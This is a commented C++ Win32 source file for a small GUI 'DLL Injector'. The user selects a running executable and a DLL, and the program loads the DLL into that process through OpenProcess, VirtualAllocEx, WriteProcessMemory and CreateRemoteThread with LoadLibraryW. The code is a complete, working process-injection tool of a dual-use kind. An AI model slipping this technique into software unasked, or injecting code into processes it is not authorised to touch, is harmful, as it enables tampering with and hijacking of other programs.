////////////////////////////////////////////////////////////////
//
// Hello from LoulouNoLegend!
// 
// Have fun looking trough the code and modifying it if you want, to be honest, I would even be down for people to crontribute and make this better! 
// I tried adding a lot of comments to make all this more understandable.. I hope they will help.
// Also, here's the documentation I used to do a big part of this: https://learn.microsoft.com/en-us/windows/win32/
// 
////////////////////////////////////////////////////////////////

#include <windows.h>
#include <TlHelp32.h>
#include <string>
#include <commdlg.h>

// Global variables for file paths
std::wstring exePath;  // Path of executable
std::wstring dllPath;  // Path of DLL

// Functions call
DWORD GetProcessID(const std::wstring& exePath);  // Retrieves the process ID from the executable path
void InjectDLL(DWORD processID, const std::wstring& dllPath);  // Injects the DLL into the process
std::wstring SelectFile(bool isDll);  // Opens a file dialog to select a file
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);  // Callback function to handle window messages

// Constants for UI elements
#define BUTTON_SELECT_EXE 101 // Button to select the exe
#define BUTTON_SELECT_DLL 102 // Button to select the dll
#define BUTTON_INJECT_DLL 103 // Button to inject the dll
#define STATIC_EXE_PATH   201 // The text showing the exe path
#define STATIC_DLL_PATH   202 // The text showing the dll path

int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR pCmdLine, int nCmdShow) {
    // Register the window class
    const wchar_t CLASS_NAME[] = L"Injector Window Class";

    WNDCLASS wc = {};
    wc.lpfnWndProc = WindowProc;  // Window procedure function
    wc.hInstance = hInstance;  // Application instance handle
    wc.lpszClassName = CLASS_NAME;  // Window class name

    // Register the window class
    RegisterClass(&wc);

    // Create the window
    HWND hwnd = CreateWindowEx(
        0,                          // Optional window styles
        CLASS_NAME,                 // Window class
        L"Loulou's DLL Injector | Version 1 - 24.08.2024",  // The title of the Window
        WS_OVERLAPPEDWINDOW,        // Window style

        CW_USEDEFAULT, CW_USEDEFAULT, 600, 200, // Size and position

        nullptr,                    // Parent window    
        nullptr,                    // Menu
        hInstance,                  // Instance handle
        nullptr                     // Additional application data
    );

    // if window creation failed
    if (hwnd == nullptr) {
        return 0;
    }

    // Show the window
    ShowWindow(hwnd, nCmdShow);

    // Run the message loop
    MSG msg = {};
    while (GetMessage(&msg, nullptr, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        // Create buttons and static controls
        CreateWindow(
            L"BUTTON",              // Class name
            L"Select Executable",   // Window text
            WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,  // Window styles
            20, 20,                 // Position (x, y) - relative to the parent window
            150, 30,                // Size (width, height)
            hwnd,                   // Parent window handle
            (HMENU)BUTTON_SELECT_EXE,   // Menu handle (used to know which button was pressed)
            (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE),  // Instance handle
            nullptr                 // Additional app data: usually `nullptr` unless you need to pass specific data
        );

        CreateWindow(L"STATIC", L"No executable selected.", WS_VISIBLE | WS_CHILD,
            180, 20, 400, 30, hwnd, (HMENU)STATIC_EXE_PATH, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), nullptr);

        CreateWindow(L"BUTTON", L"Select DLL", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            20, 70, 150, 30, hwnd, (HMENU)BUTTON_SELECT_DLL, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), nullptr);

        CreateWindow(L"STATIC", L"No DLL selected.", WS_VISIBLE | WS_CHILD,
            180, 70, 400, 30, hwnd, (HMENU)STATIC_DLL_PATH, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), nullptr);

        CreateWindow(L"BUTTON", L"Inject DLL", WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
            20, 120, 150, 30, hwnd, (HMENU)BUTTON_INJECT_DLL, (HINSTANCE)GetWindowLongPtr(hwnd, GWLP_HINSTANCE), nullptr);
        break;
    }
    case WM_COMMAND: {
        switch (LOWORD(wParam)) {
        case BUTTON_SELECT_EXE: {
            // Open file dialog to select an executable
            exePath = SelectFile(false);
            SetWindowText(GetDlgItem(hwnd, STATIC_EXE_PATH), exePath.empty() ? L"No executable selected." : exePath.c_str());
            break;
        }
        case BUTTON_SELECT_DLL: {
            // Open file dialog to select a DLL
            dllPath = SelectFile(true);
            SetWindowText(GetDlgItem(hwnd, STATIC_DLL_PATH), dllPath.empty() ? L"No DLL selected." : dllPath.c_str());
            break;
        }
        case BUTTON_INJECT_DLL: {
            // Inject the DLL into the selected executable
            if (!exePath.empty() && !dllPath.empty()) {
                DWORD processID = GetProcessID(exePath);
                if (processID) {
                    InjectDLL(processID, dllPath);
                    MessageBox(hwnd, L"DLL injected successfully.", L"Success", MB_OK);
                }
                else {
                    MessageBox(hwnd, L"Process not found. Make sure the executable is running.", L"Error", MB_OK | MB_ICONERROR);
                }
            }
            else {
                MessageBox(hwnd, L"Please select both an executable and a DLL.", L"Error", MB_OK | MB_ICONERROR);
            }
            break;
        }
        }
        break;
    }
    case WM_DESTROY: {
        // Post a quit message and exit
        PostQuitMessage(0);
        return 0;
    }
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

DWORD GetProcessID(const std::wstring& exePath) {
    DWORD processID = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(entry);

    // Extract the executable name from the path
    std::wstring exeName = exePath.substr(exePath.find_last_of(L"\\") + 1);

    // Iterate through processes to find the matching executable
    if (Process32First(snap, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, exeName.c_str())) {
                processID = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snap, &entry));
    }
    CloseHandle(snap);
    return processID;
}

void InjectDLL(DWORD processID, const std::wstring& dllPath) {
    // Open the target process with all access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (hProcess && processID) {
        // Allocate memory in the target process for the DLL path
        void* allocatedMemory = VirtualAllocEx(hProcess, nullptr, MAX_PATH * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        // Write the DLL path into the allocated memory
        WriteProcessMemory(hProcess, allocatedMemory, dllPath.c_str(), (dllPath.size() + 1) * sizeof(wchar_t), nullptr);
        // Create a remote thread in the target process to load the DLL
        HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)LoadLibraryW, allocatedMemory, 0, nullptr);
        if (hThread) {
            CloseHandle(hThread);
        }
        CloseHandle(hProcess);
    }
}

std::wstring SelectFile(bool isDll) {
    wchar_t filePath[MAX_PATH] = { 0 };

    OPENFILENAME ofn;
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = nullptr;
    ofn.lpstrFile = filePath;
    ofn.nMaxFile = sizeof(filePath) / sizeof(wchar_t);

    // Set file filter based on whether selecting DLL or executable
    if (isDll) {
        ofn.lpstrFilter = L"Dynamic link library (.dll)\0*.dll\0"; // DLL filter
    }
    else {
        ofn.lpstrFilter = L"Executable (.exe)\0*.exe\0"; // Executable filter
    }
    ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST | OFN_EXPLORER;

    // Open the file dialog and return the selected file path
    if (GetOpenFileName(&ofn)) {
        return std::wstring(filePath);
    }
    else {
        return L"";  // Return an empty string if no file was selected
    }
}
